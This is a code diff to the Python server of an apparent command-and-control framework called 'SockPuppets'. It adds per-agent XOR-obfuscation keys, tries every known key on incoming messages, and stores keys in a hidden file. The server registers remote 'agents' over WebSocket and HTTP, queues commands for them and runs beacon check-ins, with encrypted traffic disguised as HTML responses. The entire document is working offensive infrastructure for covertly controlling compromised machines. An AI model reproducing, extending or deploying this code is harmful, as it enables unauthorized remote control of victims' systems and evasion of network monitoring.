@@ -40,6 +40,7 @@ class Agent:
         self.metadata = metadata
         self.transport_type = transport_type  # 'websocket', 'http', 'https'
         self.websocket = None  # WebSocket connection (if WS transport)
+        self.encryption_key = None  # Per-agent encryption key (bytes)
         self.connected_at = datetime.now()
         self.last_seen = datetime.now()
         self.command_queue = asyncio.Queue()
@@ -79,11 +80,15 @@ class SockPuppetsServer:
     """Main server class"""
     def __init__(self, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
         self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
+        # Per-agent key support: set of all known valid encryption keys
+        self.known_keys: set = {self.encryption_key}
         self.agents: Dict[str, Agent] = {}
         self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
         self.listeners: Dict[str, dict] = {}  # Track active listeners {name: {type, host, port, task, ...}}
         self.streaming_module = self._load_streaming_module()
         self.ws_server = None
+        self._keys_file = Path(__file__).parent / '.agent_keys.json'
+        self._load_saved_keys()
 
     def _load_streaming_module(self) -> str:
         """Load and compress streaming module"""
@@ -102,19 +107,69 @@ class SockPuppetsServer:
             logger.error(f"Failed to load streaming module: {e}")
             return ""
 
-    def simple_encrypt(self, data: str) -> str:
-        """XOR-based obfuscation"""
-        key = self.encryption_key
+    def simple_encrypt(self, data: str, key: bytes = None) -> str:
+        """XOR-based obfuscation with optional per-agent key"""
+        key = key or self.encryption_key
         encoded = data.encode('latin-1')
         encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
         return base64.b64encode(encrypted).decode()
 
-    def simple_decrypt(self, data: str) -> str:
-        """Decrypt XOR obfuscation"""
-        key = self.encryption_key
+    def simple_decrypt(self, data: str, key: bytes = None) -> str:
+        """Decrypt XOR obfuscation with optional per-agent key"""
+        key = key or self.encryption_key
         decoded = base64.b64decode(data.encode())
         decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
         return decrypted.decode('latin-1')
+
+    def try_decrypt(self, data: str) -> tuple:
+        """Try all known keys to decrypt data. Returns (decrypted_str, key_used).
+        Raises ValueError if no key works."""
+        for key in self.known_keys:
+            try:
+                decoded = base64.b64decode(data.encode())
+                decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+                result = decrypted.decode('latin-1')
+                json.loads(result)  # validate it's real JSON
+                return result, key
+            except (json.JSONDecodeError, UnicodeDecodeError, Exception):
+                continue
+        raise ValueError("No known key could decrypt the message")
+
+    def encrypt_for_agent(self, agent_id: str, data: str) -> str:
+        """Encrypt data using the agent's specific key"""
+        if agent_id in self.agents and self.agents[agent_id].encryption_key:
+            return self.simple_encrypt(data, self.agents[agent_id].encryption_key)
+        return self.simple_encrypt(data)
+
+    def add_encryption_key(self, key) -> None:
+        """Register a new agent encryption key"""
+        if isinstance(key, str):
+            key = key.encode()
+        self.known_keys.add(key)
+        self._save_keys()
+        logger.info(f"Added encryption key ({len(self.known_keys)} total keys)")
+
+    def _save_keys(self):
+        """Persist known keys to disk"""
+        try:
+            keys_list = [k.decode() if isinstance(k, bytes) else k for k in self.known_keys]
+            with open(self._keys_file, 'w') as f:
+                json.dump(keys_list, f)
+        except Exception as e:
+            logger.debug(f"Could not save keys: {e}")
+
+    def _load_saved_keys(self):
+        """Load previously saved keys from disk"""
+        try:
+            if self._keys_file.exists():
+                with open(self._keys_file, 'r') as f:
+                    keys_list = json.load(f)
+                for k in keys_list:
+                    self.known_keys.add(k.encode() if isinstance(k, str) else k)
+                if len(keys_list) > 1:
+                    logger.info(f"Loaded {len(keys_list)} saved encryption keys")
+        except Exception as e:
+            logger.debug(f"Could not load saved keys: {e}")
 
     # ──────────────────────────────────────────────
     # TLS Certificate Management
@@ -231,27 +286,37 @@ class SockPuppetsServer:
     async def handle_agent(self, websocket, path=None):
         """Handle individual agent connection (WebSocket)"""
         agent_id = None
+        ws_key = None  # Track which key this WS connection uses
         try:
             async for message in websocket:
                 try:
-                    # Decrypt and parse message
-                    decrypted = self.simple_decrypt(message)
-                    data = json.loads(decrypted)
+                    # Decrypt and parse message (try per-agent key first, then all keys)
+                    if ws_key:
+                        try:
+                            decrypted = self.simple_decrypt(message, ws_key)
+                            data = json.loads(decrypted)
+                        except (json.JSONDecodeError, Exception):
+                            decrypted, ws_key = self.try_decrypt(message)
+                            data = json.loads(decrypted)
+                    else:
+                        decrypted, ws_key = self.try_decrypt(message)
+                        data = json.loads(decrypted)
 
                     msg_type = data.get('type')
 
                     if msg_type == 'register':
                         agent_id = await self.register_agent(websocket, data)
+                        agent = self.agents[agent_id]
+                        agent.encryption_key = ws_key
                         response = {
                             'type': 'registered',
                             'agent_id': agent_id,
                             'status': 'success'
                         }
-                        encrypted_response = self.simple_encrypt(json.dumps(response))
+                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                         await websocket.send(encrypted_response)
 
                         # Start command handler for this agent
-                        agent = self.agents[agent_id]
                         agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))
 
                     elif msg_type == 'checkin':
@@ -262,6 +327,7 @@ class SockPuppetsServer:
                             agent = self.agents[agent_id]
                             agent.websocket = websocket
                             agent.transport_type = 'websocket'
+                            agent.encryption_key = ws_key
                             agent.last_seen = datetime.now()
                             self.active_connections.add(websocket)
 
@@ -291,16 +357,17 @@ class SockPuppetsServer:
                                 'status': 'success'
                             }
                             agent = self.agents[agent_id]
+                            agent.encryption_key = ws_key
                             agent.command_sender_task = asyncio.create_task(self.send_commands(agent_id))
 
-                        encrypted_response = self.simple_encrypt(json.dumps(response))
+                        encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                         await websocket.send(encrypted_response)
 
                     elif msg_type == 'heartbeat':
                         if agent_id and agent_id in self.agents:
                             self.agents[agent_id].last_seen = datetime.now()
                             response = {'type': 'heartbeat_ack', 'status': 'alive'}
-                            encrypted_response = self.simple_encrypt(json.dumps(response))
+                            encrypted_response = self.simple_encrypt(json.dumps(response), ws_key)
                             await websocket.send(encrypted_response)
 
                     elif msg_type == 'response':
@@ -378,7 +445,7 @@ class SockPuppetsServer:
                     'timestamp': datetime.now().isoformat()
                 }
 
-                encrypted = self.simple_encrypt(json.dumps(message))
+                encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
 
                 # For beacon mode, retry sending if connection is closed
                 max_retries = 30 if agent.mode == 'beacon' else 1
@@ -434,7 +501,7 @@ class SockPuppetsServer:
         """Handle agent registration via HTTP POST"""
         try:
             body = await request.text()
-            decrypted = self.simple_decrypt(body)
+            decrypted, key_used = self.try_decrypt(body)
             data = json.loads(decrypted)
 
             msg_type = data.get('type')
@@ -452,13 +519,14 @@ class SockPuppetsServer:
             transport_type = 'https' if request.secure else 'http'
 
             agent = self.register_agent_common(agent_id, metadata, transport_type)
+            agent.encryption_key = key_used  # Store per-agent key
 
             response = {
                 'type': 'registered',
                 'agent_id': agent_id,
                 'status': 'success'
             }
-            encrypted_response = self.simple_encrypt(json.dumps(response))
+            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
             return web.Response(text=encrypted_response, content_type='text/html')
 
         except Exception as e:
@@ -469,7 +537,7 @@ class SockPuppetsServer:
         """Handle agent checkin/poll via HTTP POST (beacon or long-poll)"""
         try:
             body = await request.text()
-            decrypted = self.simple_decrypt(body)
+            decrypted, key_used = self.try_decrypt(body)
             data = json.loads(decrypted)
 
             msg_type = data.get('type')
@@ -550,7 +618,7 @@ class SockPuppetsServer:
                             'type': 'no_commands'
                         }
 
-                    encrypted_response = self.simple_encrypt(json.dumps(response))
+                    encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
                     return web.Response(text=encrypted_response, content_type='text/html')
 
                 else:
@@ -560,14 +628,15 @@ class SockPuppetsServer:
                     peername = request.remote
                     metadata['ip'] = peername or 'Unknown'
                     transport_type = 'https' if request.secure else 'http'
-                    self.register_agent_common(new_id, metadata, transport_type)
+                    agent = self.register_agent_common(new_id, metadata, transport_type)
+                    agent.encryption_key = key_used
 
                     response = {
                         'type': 'registered',
                         'agent_id': new_id,
                         'status': 'success'
                     }
-                    encrypted_response = self.simple_encrypt(json.dumps(response))
+                    encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
                     return web.Response(text=encrypted_response, content_type='text/html')
 
             return web.Response(status=400)
@@ -580,7 +649,7 @@ class SockPuppetsServer:
         """Handle command results via HTTP POST"""
         try:
             body = await request.text()
-            decrypted = self.simple_decrypt(body)
+            decrypted, key_used = self.try_decrypt(body)
             data = json.loads(decrypted)
 
             agent_id = data.get('agent_id')
@@ -610,7 +679,7 @@ class SockPuppetsServer:
             logger.debug(f"HTTP result received from {agent_id}: {command[:50]}...")
 
             response = {'type': 'result_ack', 'status': 'success'}
-            encrypted_response = self.simple_encrypt(json.dumps(response))
+            encrypted_response = self.simple_encrypt(json.dumps(response), key_used)
             return web.Response(text=encrypted_response, content_type='text/html')
 
         except Exception as e:
